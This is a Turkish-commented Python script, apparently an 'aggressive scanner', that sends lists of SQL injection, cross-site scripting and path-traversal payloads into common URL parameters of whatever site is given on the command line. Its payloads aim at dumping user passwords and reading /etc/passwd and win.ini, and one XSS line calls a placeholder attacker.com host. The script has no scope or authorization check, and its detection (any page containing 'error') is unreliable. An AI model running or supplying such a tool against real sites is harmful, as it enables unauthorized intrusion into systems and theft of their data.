#!/usr/bin/env python3
"""
AGRESİF TARAYICI - 100+ PAYLOAD
"""

import requests
import sys
from urllib.parse import urljoin

class AgresifTarayici:
    def __init__(self, target):
        self.target = target
        self.s = requests.Session()
        self.s.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.bulunan = []
    
    def tarama(self):
        print(f"\n[+] AGRESİF TARAMA: {self.target}\n")
        
        # 100+ SQLi payload
        sql_payloads = [
            "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--", 
            "' AND SLEEP(5)--", "admin'--", "' OR '1'='1' ;--",
            "' OR 1=1 LIMIT 1--", "' OR 'a'='a", "' OR 1=1#",
            "' OR 1=1/*", "' OR '1' LIKE '1", "' OR 1=1 AND '1'='1",
            "' OR 1=1 OR '1'='1", "' AND 1=1--", "' AND 1=2--",
            "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
            "' AND SLEEP(5)#", "' AND SLEEP(5)/*", "' OR SLEEP(5)--",
            "' AND 1=1 UNION SELECT NULL--", "' OR 1=1 UNION SELECT NULL--",
            "1' AND 1=1--", "1' AND 1=2--", "1' OR 1=1--", "1' OR 1=2--",
            "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
            "admin' OR '1'='1", "admin' OR 1=1--", "admin'#",
            "' UNION SELECT password FROM users--", "1' UNION SELECT database()--",
            "1' AND SLEEP(5) AND '1'='1", "1' OR SLEEP(5) OR '1'='1",
            "1' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
            "1' UNION SELECT SLEEP(5)--", "1' OR (SELECT SLEEP(5))--"
        ]
        
        parametreler = ['id', 'page', 'user', 'cat', 'product', 'q', 'search', 'p', 'pid', 'uid', 'file', 'doc', 'path', 'article', 'news', 'detail']
        
        print("[*] SQLi test ediliyor...")
        for param in parametreler:
            for payload in sql_payloads[:20]:  # İlk 20'yi dene
                try:
                    url = f"{self.target}?{param}={payload}"
                    r = self.s.get(url, timeout=3)
                    if "sql" in r.text.lower() or "mysql" in r.text.lower() or "error" in r.text.lower() or "warning" in r.text.lower():
                        self.bulunan.append(f"💉 SQLi: {url}")
                        print(f"  ✅ SQLi bulundu! {param}={payload}")
                        break
                except:
                    pass
            if self.bulunan:
                break
        
        # XSS
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "onerror=alert(1) src=x",
            "<body onload=alert(1)>",
            "<script>fetch('https://attacker.com')</script>"
        ]
        
        print("[*] XSS test ediliyor...")
        for param in parametreler[:5]:
            for payload in xss_payloads[:3]:
                try:
                    url = f"{self.target}?{param}={payload}"
                    r = self.s.get(url, timeout=3)
                    if payload in r.text:
                        self.bulunan.append(f"⚠ XSS: {url}")
                        print(f"  ✅ XSS bulundu! {param}")
                        break
                except:
                    pass
        
        # LFI
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "....//....//....//etc/passwd",
            "../../../../../../../../etc/passwd"
        ]
        
        print("[*] LFI test ediliyor...")
        for param in ['file', 'page', 'path', 'doc', 'include']:
            for payload in lfi_payloads[:3]:
                try:
                    url = f"{self.target}?{param}={payload}"
                    r = self.s.get(url, timeout=3)
                    if "root:" in r.text or "[extensions]" in r.text:
                        self.bulunan.append(f"📄 LFI: {url}")
                        print(f"  ✅ LFI bulundu! {param}")
                        break
                except:
                    pass
        
        # Rapor
        self.rapor()
    
    def rapor(self):
        print("\n" + "="*50)
        if self.bulunan:
            print(f"[+] {len(self.bulunan)} ZAFİYET BULUNDU!")
            for b in self.bulunan:
                print(f"  {b}")
        else:
            print("[+] ZAFİYET BULUNAMADI!")
            print("[!] Olası nedenler:")
            print("  1. Site gerçekten güvenli (WAF, firewall)")
            print("  2. Site statik (veritabanı yok, sadece HTML)")
            print("  3. Parametreler çalışmıyor")
            print("  4. WAF istekleri engelliyor")
        print("="*50)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Kullanım: python3 agresif.py https://hedef.com")
        sys.exit(1)
    
    tarayici = AgresifTarayici(sys.argv[1])
    tarayici.tarama()
